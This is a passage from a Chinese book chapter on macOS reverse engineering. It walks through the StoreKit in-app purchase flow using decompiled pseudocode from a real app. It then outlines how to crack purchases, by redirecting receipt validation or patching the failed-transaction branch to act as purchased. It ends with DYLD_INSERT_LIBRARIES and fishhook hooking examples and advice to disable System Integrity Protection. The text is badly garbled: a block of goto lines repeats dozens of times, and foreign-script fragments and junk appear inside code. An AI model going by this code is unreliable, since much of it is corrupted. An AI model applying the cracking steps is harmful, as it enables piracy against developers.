Signature。签名信息。验证签名，可以检测当前的Receipt是否有效，或者是否已经更新了。

苹果在开发文档中指出，开发人员应该在程序启动时，检测Receipt是否有效。如果无效，程序应该调用exit(173)退出，系统收到173退出码后，会自动联网请求去刷新Receipt。相应的Objective-C代码如下：

- (void)applicationWillFinishLaunching: (NSNotification *)notification {
    NSURL *receiptURL = [[NSBundle mainBundle] appStoreReceiptURL];
    if!,[[NSFileManager defaultManager] fileExistsAtPath:[receiptURL path]]
    {
        exit(173);
    }
}

接下来看看如何在程序中集成StoreKit。图9-23所示是应用内付费的步骤，整个应用内付费的开发都围绕它展开。

使用iTunes Connect创建并配置好产品信息后，就可以使用StoreKit提供的API与App Store进行交互了。从图中可以看出，整个交互过程一共发送了两次请求：一次是Makes Products Request，也就是构建产品请求。调用Store Kit向App Store发送产品请求，方法是构建一个SKProductsRequest对象的实例，该对象的作用是接收来自App Store返回的本地化产品信息列表。这些本地化的信息中包含了产品的本地化描述以及价格信息，用来展示给用户。SKProductsRequest构建完成后，再为它设置一个代理delegate，用来处理返回的信息。最后调用它的start()方法。从App Store中下载一个App，查看相应的伪代码；如下所示：

void -[ituShopMAS requestProductData](void * self, void * _cmd) {
    r14 = [SKProductsRequest alloc];
    rdx = self->_product;
    rdx = [NSSet setWithObjects:rdx];
    r14 = [r14 initWithProductIdentifiers:rdx];
    [r14 setDelegate:self]; // 设置代理
    rdi = r14;
    [rdi start]; // 调用start()
    return;
}

 </div>

SKProductsRequest的setDelegate()设置了数据返回处理的代理。它是一个SKProductsRequestDelegate协议，用来处理服务器返回的SKProductsResponse对象。该协议有一个接口方法-productsRequest:didReceiveResponse:，用来处理返回的SKProductsResponse。调用它的products属性会返回一个SKProduct列表，解析列表中的产品信息，然后展示给用户。AppStore中一个App的相应伪代码如下：

void -[ituShopMAS productsRequest:didReceiveResponse:](void * self, void * _cmd, void * arg2, var arg3) {
    r15 = self;
    rax = [arg3 products];
    var_48 = rax;
    if ([rax_count] != 0x0) {
        r12 = @selector(productIdentifier);
        var_38 = @selector(isEqualToString);
        var_30 = @selector(setHidden);
        var_78 = @selector(localizedDescription);
        var_40 = @selector(setStringValue);
        var_80 = @selector(localizedTitle);
        var_68 = @selector(stringWithFormat);
        var_88 = @selector(alloc);
        var_90 = @selector(init);
        var_98 = @selector(setFormatterBehavior);
        var_A0 = @selector(setNumberStyle);
        var_A8 = @selector(priceLocale);
        var_B0 = @selector(setLocale);
        var_B8 = @selector(price);
        var_C0 = @selector(stringFromNumber);
        var_C8 = @selector(release);
        var_D0 = @selector(setEnabled);
        var_E8 = @selector(shopNeedsIcon);
        rbx = 0x0;
        do {
            rax = [var_48 objectAtIndex:rbx];
            r13 = rax;
            rax = _objc_msgSend(rax, r12, rbx);
            rcx = *objc_ivar_offset_ituShopMAS_product;
        }
    }
}

rdx = *(r15 + rcx);
if (_objc_msgSend(rax, var_38, rdx, rcx) != 0x0) {
    rdi = r15->_product;
    rdx =与生活
    if (_objc_msgSend(rdi, var_38) == 0x0) {
        var_50 = rbx;
        r12 = r15->lblDescription;
        rax = _objc_msgSend(r13, var_78, rdx);
        _objc_msgSend(r12, var_40, rax);
        _objc_msgSend(r15->lblDescription, var_30, 0x0);
        var_70 = r15->lblProductName;
        rcx = _objc_msgSend(r13, var_80, 0x0);
        rax = _objc_msgSend(@class(NSSString), var_68, "%@ only", rcx);
        _objc_msgSend(var_70, var_40, rax);
        _objc_msgSend(r15->lblProductName, var_30, 0x0);
        rbx = _objc_msgSend( _objc_msgSend(@class(NSNumberFormatter), var_88, 0x0), var_90, 0x0);
        _objc_msgSend(rbx, var_98, 0x410);
        _objc_msgSend(rbx, var_A0, 0x2);
        rdx = _objc_msgSend(r13, var_A8, 0x2);
        _objc_msgSend(rbx, var_B0, rdx);
        rdi = r13;
        r13 = rdi;
        rdx = _objc_msgSend(rdi, var_B8, rdx);
        var_70 = _objc_msgSend(rbx, var_C0, rdx);
        _objc_msgSend(rbx, var_C8, rdx);
        r12 = r15->lblPrice;
        rcx = var_70;
        rax = _objc_msgSend(@class(NSSString), var_68, "%@", rcx);
        _objc_msgSend(r12, var_40, rax);
        rdi = r15->lblPrice;
        rbx = var_50;
        _objc_msgSend(rdi, var_30, 0x0);
        _objc_msgSend(r15->btnPurchase, var_D0, 0x1);
        _objc_msgSend(r15->lblRestore, var_30, 0x0);
        _objc_msgSend(r15->imgIcon, var_30, 0x0);
    }
    .....
}

rax = _objc_msgSend(r13, r12, rdx, rcx);
rdx = @"iboostup.premium";
if (_objc_msgSend(rax, var_38, rdx, rcx) != 0x0) {
    var_50 = rbx;
    r12 = r15->lblDescriptionPro;
    rax = _objc_msgSend(r13, var_78, rdx);
    _objc_msgSend(r12, var_40, rax);
    _objc_msgSend(r15->lblDescriptionPro, var_30, 0x0);
    var_70 = r15->lblProductNamePro;
    rcx = _objc_msgSend(r13, var_80, 0x0);
    rax = _objc_msgSend(@class(NSSString), var_68, "%@", rcx);
    _objc_msgSend(var_70, var_40, rax);
    _objc_msgSend(r15->lblProductNamePro, var_30, 0x0);
    rbx = _objc_msgSend( _objc_msgSend(@class(NSSString), var_88, var_90, 0x0);
    0x0);

_objc_msgSend(rdi, var_40, rax);
_objc_msgSend(r15->lblPricePro, var_30, 0x0);
_objc_msgSend(r15->btnPurchasePro, var_D0, 0x1);
_objc_msgSend(r15->lblRestorePro, var_30, 0x0);
_objc_msgSend(r15->imgIconPro, var_30, 0x0);
}
_objc_msgSend(r15->boxWait, var_30, 0x1, rcx);
rbx = rbx + 0x1;
} while (rbx < [var_48 count]);
}
return;
}

解析完产品信息，展示给用户。当用户选择好产品点击购买时，就会发出第2次请求：Makes Payment Request，也就是构建付款请求。该请求通过调用SKPaymentQueue的addPayment()方法，添加一个SKPayment对象。例如，某产品点击购买某功能选项的伪代码如下：

void -[ituShopMAS btnPurchaseClicked:](void * self, void * _cmd, void * arg2) {
    [self waitUI];
    rdi = [SK变色值[
    rdi = [rdi init];
    r15 = [rdi autorelease];
    rdx = self->_product;
    [r15 setProductIdentifier:rdx]; // 设置产品标识
    [r15 setQuantity:0x1];
    rdi = [SK变色值[
    rdx = r15;
    [rdi addPayment:rdx]; // 添加支付请求
    return;
]

defaultQueue()方法返回一个单例的SKPaymentQueue实例，它是一个队列结构，由App Store去处理。操作完成后，产品支付请求就加入到支付队列中了。要想处理支付的状态，例如购买成功、购买失败、购买取消等处理的逻辑，就需要为队列添加一个观察者。当队列中交易的状态被更新，或者当交易从队列中删除的时候，观察者应该能正确及时地处理所有的交易信息，并根据交易的结果为购买成功的用户提供相应的功能。添加观察者的操作要在addPayment()调用前完成，通常是在程序的初始化时完成的，代码如下所示：

void *-[ituShopMAS init](void * self, void * _cmd) {
rbx = self;
rcx = [SKPaymentQueue canMakePayments];
rax = 0x0;
if (rcx != 0x0) {
rbx = [[rbx super] init];
rax = 0x0;
if (rbx != 0x0) {
rbx->checked = 0x0;
rbx->failures = 0x0;
if ([NSBundle loadNibNamed:@"ituShopMAS" owner:rbx] != 0x0) {
rdi = rbx->lblCancel;
[rdi setStringValue:@"Cancel");

[rbx->lblCancel setClickTarget:rbx sel:@selector(lblCancelClicked)];
[rbx->lblRestore setStringValue:@"Restore";
[rbx->lblRestore setClickTarget:rbx sel:@selector(lblRestoreClicked)];
[rbx->lblRestorePro setStringValue:@"Restore";
[rbx->lblRestorePro setClickTarget:rbx
sel:@selector(lblRestoreProClicked)];
rax = [SKPaymentQueue defaultQueue]; // 获取单例队列实例
[rax addTransactionObserver:rbx]; // 添加观察者
}
rax = rbx;
}
}
return rax;
}

添加观察者对象使用addTransactionObserver()方法，它传入的是一个SKPaymentTransactionObserver协议对象，SKPaymentTransactionObserver协议有一系列方法被SKPaymentQueue调用。下面我们分别进行介绍。

# 1. 处理交易

处理交易包括-paymentQueue:updatedTransactions:与-paymentQueue:removedTransactions:方法。前者在一个或多个交易状态更新时被调用，在目标程序中，它必须实现；后者则在交易移除时被调用，在目标程序中，它的实现是可选的。

这两个方法传入的参数都是一个 SKPaymentTransaction类型的数组，每一个 SKPayment-Transaction代表着一个支付交易对象，应用程序要明确地处理每个交易对象的返回结果，根据它的 transactionState 属性来判断交易是否成功。如果 transactionState 的值是 SKPayment-TransactionStatePurchased，则表示交易成功，此时程序应该向用户提供收费成功后的功能；如果 transactionState 的值为 SKPaymentTransactionStateFailed，则表示交易失败，应用程序应该获取交易失败的错误信息并反馈给用户。交易的状态是一个枚举值，定义如下：

enum {
    SKPaymentTransactionStatePurchasing, //正在付款
    SKPaymentTransactionStatePurchased, //付款成功
    SKPaymentTransactionStateFailed, //付款失败
    SKPaymentTransactionStateRestored, //交易已恢复
    SKPaymentTransactionStateDeferred, //交易已推迟
};

typedef NSInteger SKPaymentTransactionState;

一个典型的-paymentQueue:updatedTransactions:代码的逻辑如下所示：
void -[ituShopMAS paymentQueue:updatedTransactions:](void * self, void * _cmd, void * arg2, void * arg3)
{
    var_F8 = arg3;
    r13 = self;
    var_30 = *__stack_chk_guard;
    intrinsic_movaps(var_40, 0x0, arg2, arg3);
    intrinsic_movaps(var_50, 0x0);
    var_60 = intrinsic_movaps(var_60, 0x0);
}

var_70 = intrinsic_movaps(var_70, 0x0);
rbx = [arg3_countByEnumeratingWithState:var_70_objects:var_F0_count:0x10];
if (rbx == 0x0) goto loc_10001eb00; //如果交易的数量为0，则直接返回

loc_10001ea53:
    r14 = *var_60;
    goto loc_10001ea5a;

loc_10001ea5a:
    r15 = 0x0;
    goto loc_10001ea5d;

loc_10001ea5d:
    if (*var_60 != r14) { //枚举所有的交易
        objc_enumerationMutation(var_F8);
    }
    r12 = *(var_68 + r15 * 0x8);
    rax = [r12_transactionState]; //判断每个交易的transactionState
    if (rax == 0x3) goto loc_10001eaa2; //3表示SKPaymentTransactionStateRestored

    loc_10001ea90:
    if (rax != 0x2) goto loc_10001eaae; //2表示SKPaymentTransactionStateFailed

    loc_10001ea96:
    rdi = r13;
    rsi = @selector(failedTransaction:); //交易失败
    goto loc_10001eabe;

    loc_10001eabe:
    _objc_msgSend(rdi, rsi); //为不同的状态执行不同的选择器方法
    goto loc_10001eac7;

    loc_10001eac7:
    r15 = r15 + 0x1;
    if (r15 < rbx) goto loc_10001ea5d;

    loc_10001eacf:
    rbx = [var_F8_countByEnumeratingWithState:var_70_objects:var_F0_count:0x10];
    if (rbx != 0x0) goto loc_10001ea5a;

    loc_10001eb00:
    if (*__stack_chk_guard != var_30) {
        __stack_chk_fail();
    }
    return;

    loc_10001eae:
    if (rax != 0x1) goto loc_10001eac7; //1表示SKPaymentTransactionStatePurchase

    loc_10001eab4:
    rdi = r13;
    rsi = @selector(completeTransaction:); //交易完成
    goto loc_10001eabe;

    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea53:
    r15 = 0x0;
    goto loc_10001ea5d;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5d:
    r15 = 0x0;
    goto loc_10001ea5d;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea5a:
    r14 = *var_60;
    goto loc_10001ea5a;

    loc_10001ea

loc_10001eaa2:
    rdi = r13;
    rsi = @selector(restoreTransaction:); // 交易恢复
    goto loc_10001eabe;
}

# 2. 处理恢复交易

恢复交易有两个方法，一个是交易成功后的处理，另一个是失败后的处理。它们分别是-paymentQueueRestoreCompletedTransactionsFinished:

-paymentQueue:restoreCompletedTransactionsFailedWithError:。恢复失败的原因通常是网络或本地的Receipt验证失败。一段典型的处理代码如下：

void -[ituShopMAS paymentQueue:restoreCompletedTransactionsFailedWithError:](void *self, void *_cm0
void *arg2, void *arg3) {
    rcx = [arg3 description];
    NSLog(@"Restore failed: %@", rcx);
    [self->boxWait setHidden:0x0];
    [self->lblResult setStringValue:@"Restore failed."];
    [self->lblProductName setHidden:0x0];
    [self->lblDescription setHidden:0x0];
    [self->wvWait setHidden:0x1];
    [self->lblPrice setHidden:0x0];
    [self->btnPurchase setEnabled:0x1];
    [self->lblRestore setHidden:0x0];
    rcx = self->_product;
    [self sendTxEvent:@"restore-fail" product:rcx];
    rax = [NSBundle mainBundle];
    rdx = @selector(appStoreReceiptURL);
    if ([rax respondsToSelector:rdx] != 0x0) && ([NSFileManager defaultManager] fileExistsAtPath:[[[NSBundle mainBundle] appStoreReceiptURL] path], rcx] == 0x0) {
        exit(Oxad);
    }
    return;
}

# 3. 处理下载动作

处理下载动作只有一个方法-paymentQueue:updatedDownloads：，而且它是可选的，只有提供付费下载与订阅的程序才需要实现它。

了解了API的使用方法，再来分析如何破解它就没那么困难了。首先，应该考虑的是如何做到通用破解，即破解IAP的机制后，可以将同类型的产品一次全部破解！这种想法并不是异想天开，在macOS 10.9系统以前，就曾经出现过这样的破解工具与方法。例如2012年7月，一位名叫Alexy的俄罗斯黑客公布了一个针对macOS系统上的IAP的破解方法。在本地系统中安装两张证书，然后使用一款名为Grim Receiver（死神）的工具，就可以一次性破解App Store中大量支持内购的程序。它的原理是将App Store内购请求的通信地址转向自己搭建的内购验证服务器上，使交易发生变化时transactionState的值永远是SKPaymentTransactionStatePurchased。这类破解行为对苹果公司与软件开发人员的打击是巨大的。之后，苹果公司为了阻止这类行为发生，采取了不

少措施，包括联系Alexy网站的ISP关闭Alexy的网站，联系Paypal拒绝为Alexy的公开账号提供转帐服务，修补App Store的程序验证漏洞等。10.9版本后，Grim Receiver变得无效，但Alexy似乎并没有放弃对IAP破解的尝试。其实这位黑客还开发出了针对Android与iOS系统内购的破解工具。之后，Alexy使用比特币来收取世界各地人员的开发捐助，网站的ISP也改为了一个地下服务商。在macOS系统10.11初期，Alexy甚至成功开发出了内购破解工具。不过苹果公司一直没放弃对他的关注，很快就为破解的漏洞打上了补丁。目前，Alexy还在积极地尝试如何破解最新的IAP机制。Grim Receiver运行效果如图9-24所示。

 </div>

 </div>

虽然做到通用破解有些难度，但针对个体内购机制的App破解，难度可能就没这么大了。一个典型的破解思路是：修改-paymentQueue:updatedTransactions:方法的代码逻辑，将交易transactionState为SKPaymentTransactionStateFailed时的代码逻辑改成SKPaymentTransaction-StatePurchased时的代码就可以了。而在具体执行破解操作时，可以使用爆破的手段在程序中进行修改，或者使用下一节介绍的Hook技术，对方法的返回结果进行Hook。

### 9.4 Hook 技术

Hook中文名是钩子。在软件安全中被称为“挂钩”技术，意思是将目标函数“钩住”后，查看它的参数与返回值，或者修改函数的函数体。目前，在macOS平台上的Hook技术主要有以下3种。

DYLD_INSERT_LIBRARIES。插入库Hook方式，类似于Linux平台的LD_PRELOAD方式。这种Hook方式比较常见，除了可以Hook常见的C与C++开发的程序库外，还可以Hook系统库中的函数，在软件安全行业中使用得比较广泛。

☐ SymbolTable Hook。符号表Hook方式，类似于Windows平台的IAT Hook。

□ Method Swizzing。方法欺骗。这种Hook方式是macOS的Objective Runtime方式独有的，运用于Objective C/C++与Swift的Hook。

   </div>

### 9.4.1 DYLD_INSERT_LIBRARIES

DYLD_INSERT_LIBRARIES是dyld使用的环境变量。使用该变量指定需要插入的动态库后，dyld在加载目标程序时会将指定插入的动态库的符号替换掉目标程序中的符号，这种机制就完成了目标程序中符号的Hook。代码如下所示：

//main.c
#include <stdio.h>
#include <unistd.h>
#include <STDINT.h>
#import <FCNTL.h>

int main(int argc, const char * argv[]) {
    int fd = open(argv[0], O_RDONLY);
    uint32_t magic_number = 0;
    read(fd, (void*)&magic_number, 4);
    printf("Mach-O Magic Number: %x\n", magic_number);

    close(fd);

    return 0;
}

执行如下命令编译并运行：

$ cc hookapp/main.c -o ./app
$./app
Mach-O Magic Number: feedfacf

直接运行程序，编译输出了程序的Magic Number。下面要Hook程序的open()、read()、close()

这3个系统函数。编译如下插入库代码：

//hook.c
#include <stdio.h>
#import <dlfcn.h>
#import <stdarg.h>
#import <stdio.h>
#import <stdlib.h>
#import <unistd.h>
#import <ஸ்ட்டిం.h>
#import <fdnt1.h>
#import <string.h>

static int (*orig_open)(const char *, int, ...) = NULL;
static ssize_t (*orig_read)(int, void *, size_t) = NULL;
static int (*orig_close)(int) = NULL;

typedef int (*orig_open_type)(const char *, int, ...);
typedef ssize_t (*orig_read_type)(int, void *, size_t);
typedef int (*orig_close_type)(int);

__attribute_((constructor))

void init_funcs()
{
    printf("-----init funcs.-----\\n");
    void *handle = dlopen("libSystem.dylib", RTLD_NOW);

    orig_open = (orig_open_type) dlsym(handle, "open");
    if(!orig_open) {
        printf("get open() addr error");
        exit(-1);
    }
    orig_read = (orig_read_type) dlsym(handle, "read");
    if(!orig_read) {
        printf("get open() addr error");
        exit(-1);
    }
    orig_close = (orig_close_type) dlsym(handle, "close");
    if(!orig_close) {
        printf("get open() addr error");
        exit(-1);
    }

    printf("-----init done-----\\n");
}

int open(const char *path, int oflag, ...) {
    va_list ap = {0};
    mode_t mode = 0;

    if ((oflag & 0_CREAT) != 0) {
        va_start(ap, oflag);
        mode = va_arg(ap, int);
        va_end(ap);
        printf("Calling real open('%s', %d, %d)\n", path, oflag, mode);
        return orig_open(path, oflag, mode);
    } else {
        printf("Calling real open('%s', %d)\n", path, oflag);
        return orig_open(path, oflag, mode);
    }
}

ssize_t read(int fd, void *buf, size_t sz) {
    printf("Calling real read(%d)\n", fd);
    ssize_t sz_ = orig_read(fd, buf, sz);
    if (sz == sz) {
        memset(buf, 97, sz);
    }
    return sz;
}

int close(int fd) {
    printf("Calling real close(%d)\n", fd);
    return orig_close(fd);
}

这段程序首先构造了一个初始化方法init_funcs()，通过为方法添加编译器预处理指令__attribute__((constructor))（该指令是早期的gcc编译器专有的，最新的Clang编译器支持该指令），可以指定该方法为初始化方法。初始化方法会在动态库加载的时候最先被调用，此处设置此方法的目的是获取系统原来3个函数的地址，并保存下来供以后使用。接着在代码中实现自己要Hook的函数的内容，与原函数名称一样。在这段代码中，为了保证程序正常运行，代码都调用了原先的方法。

执行如下命令编译并测试Hook:

$ cc -flat_namespace -dynamiclib -o ./libhook.dylib hook/hook.c
$ export DYLD_FORCE_FLAT_نامهSPACE=1
$ DYLD_INSERT_LIBRARIES=libhook.dylib ./app
------init funcs.\_\_\_\_\_\_
------init done\_\_\_\_\_\_
Calling real open('./app', 0)
Calling real read(3)
Mach-O Magic Number: 61616161
Calling real close(3)

从结果上看，这3个函数都Hook成功了！在代码中，我们修改了read()的实现，将所有的内容字节全部改成了0x61（字母a）。

仔细查看编译命令，可以看出为命令行添加了一个`flat_namespace`选项，并且在执行插入库之前将环境变量`DYLD_FORCE_FLAT_نامهSPACE`设置成了1。这样做是有原因的，这涉及系统加载动态库时符号搜索的问题。可执行文件中生成的函数、变量、常量都是以符号表示的，当链接器动态链接程序时，传递的其实是这些符号的名字。例如，当启动程序时，最先执行的`main`函数，它的符号就是`main`。在`macOS 10.1`版本之前，编译工具将可执行文件中所有的符号都放到了一个独立的全局列表中，程序中所有引用到的符号都可以在列表中找到。正因为符号以这种“平坦”式的地址方式保存，所以被称为平坦名称空间（`flat_namespace`）。从`macOS 10.1`版本开始，系统引入了全新的二级符号名称空间（`two-level symbol namespace`）特性，第一级表示符号所在动态库的名称，第二级表示符号本身的名称。在启用了二级名称空间特性后，动态链接器在进行符号绑定操作时，就可以明确地知道到哪个动态库中找哪个符号，符号绑定的速度比平坦空间模式快很多。因此，在`macOS 10.1`版本之后，编译器默认开启二级符号名称空间特性。

在使用DYLD_INSERT_LIBRARIES插入动态库时，由于dyld符号搜索的特性只对平坦模式的名称空间下的符号有效，对于二级符号名称空间无效，因此，将dyld的环境变量DYLD_FORCE_FLAT_SPACE置为1后，dyld在加载程序时，会强制所有的镜像以平坦模式名称空间的方式来加载，而忽略掉所有的二级名称空间的符号绑定。

注意，macOS系统开启Rootless后，dyld在动态链接程序时会自动忽略所有“DYLD_”开头的环境变量。因此，使用该技术前需要关闭Rootless。Rootless关闭方法可以参看前面的章节。

#### 9.4.2 SymbolTable Hook

SymbolTable Hook即符号表Hook，通过对目标程序的符号表做手脚来达到Hook的目的。Mach-O程序中的符号分为两种，一种是直接在动态链接程序时就需要绑定的符号non-lazily symbol，即非延迟绑定的符号，它保存在___DATA段中的___nl_symbol_ptr节区中；另一种是在程序运行后第一次调用才会绑定的符号lazily symbol，即延迟绑定的符号，它保存在___DATA段中的___la_symbol_ptr节区中。延迟绑定符号的绑定操作是dyld在加载程序时，通过例程dyld_stub_binder完成的。这两张表都保存了符号的名称与内存中的地址，符号表Hook的原理就是在镜像加载绑定符号时，修改符号表指向的内存地址，通过这种“移花接木”的方式来完成Hook。

基于这种Hook思想，网上有Facebook公司发布的开源符号表Hook工具fishhook $ ^{①} $，虽然介绍中说是针对iOS平台的，但实际上对macOS系统上的Mach-O文件的符号表Hook也是可用的。

fishhook提供了rebind_symbols()与rebind_symbols_image()，来实现对当前镜像与指定镜像的符号重绑定工作，这两个方法都是调用rebind_symbols_for_image()来完成工作的。它的代码片段如下所示：

static void rebind_symbols_for_image(struct reboundings_entry *reboundings,
                                   const struct mach_header *header,
                                   intptr_t slide) {

    uintptr_t cur = (uintptr_t)header + sizeof(mach_header_t);
    for (uint i = 0; i < header->ncmds; i++, cur += cur_seg_cmd->cmdsize) {
        cur_seg_cmd = (segment_command_t *)cur;
        if (cur_seg_cmd->cmd == LC_SEGMENT_ARCH_DEPENDENT) {
            if (strcmp(cur_seg_cmd->segname, SEG_LINKEDIT) == 0) {
                linkedin_segment = cur_seg_cmd; // 符号的数据位于 __LINKEDIT_段
            }
        } else if (cur_seg_cmd->cmd == LC_SYMTAB) {
            symtab_cmd = (struct symtab_command*)cur_seg_cmd; // 符号表加载命令
        } else if (cur_seg_cmd->cmd == LC_DYSYMTAB) {
            dysymtab_cmd = (struct dysymtab_command*)cur_seg_cmd; // 动态符号表加载命令
        }
    }
}

// 符号表与字符串表的基址
uintptr_t linkedit_base = (uintptr_t)slide + linkedit_segment->vmaddr - linkedit_segment->fileoff
nlist_t *symtab = (nlist_t *)(linkedit_base + symtab_cmd->symoff);
char *strtab = (char *)(linkedit_base + symtab_cmd->stroff);

// 获取直接符号表，存放的符号信息索引用于在符号表中定位符号名
uint32_t *indirect_symtab = (uint32_t *)(linkedit_base + dysymtab_cmd->indirectsymoff);

cur = (uintptr_t)header + sizeof(mach_header_t);
for (uint i = 0; i < header->ncmds; i++, cur += cur_seg_cmd->cmdsize) {
    cur_seg_cmd = (segment_command_t *)cur;
    if (cur_seg_cmd->cmd == LC_SEGMENT_ARCH_DEPENDENT) {
        if (strcmp(cur_seg_cmd->segname, SEG_DATA) != 0 &&
                   strcmp(cur_seg_cmd->segname, SEG_DATA_CONST) != 0) {
            continue;
        }
        for (uint j = 0; j < cur_seg_cmd->nsects; j++) {
            section_t *sect =
                   (section_t *) (cur + sizeof(segment_command_t)) + j;
        }
        if ((sect->flags & SECTION_TYPE) == S_LAZY_SYMBOL_POINTERS) { //操作延迟绑定符号
            perform_rebinding_with_section(reboundings, sect, slide, symtab, strtab, indirect_symtab;
        }
        if ((sect->flags & SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) { //操作非延迟绑定符号
            perform_rebinding_with_section(reboundings, sect, slide, symtab, strtab, indirect_symtab;
        }
    }
}

static void perform_rebinding_with_section(struct reboundings_entry *reboundings,
                                   section_t *section,
                                   intptr_t slide,
                                   nlist_t *symtab,
                                   char *strtab,
                                   uint32_t *indirect_symtab) {

                struct reboundings_entry *cur = reboundings;

                while (cur) {
                    for (uint j = 0; j < cur->reboundings_nel; j++) {
                        if (strcmp(&symbol_name[1], cur->reboundings[j].name) == 0) { //找到符号后，就进行替换
                            if (cur->reboundings[j].replaced != NULL &&
                                     indirect_symbol_boundings[i] != cur->reboundings[j].replacement) {
                                    *(cur->reboundings[j].replaced) = indirect_symbol_boundings[i];
                            }
                            indirect_symbol_boundings[i] = cur->reboundings[j].replacement;
                            goto symbol_loop;
                        }
                    }
                    cur = cur->next;
                }
            }
        }
        symbol_loop;
    }
}

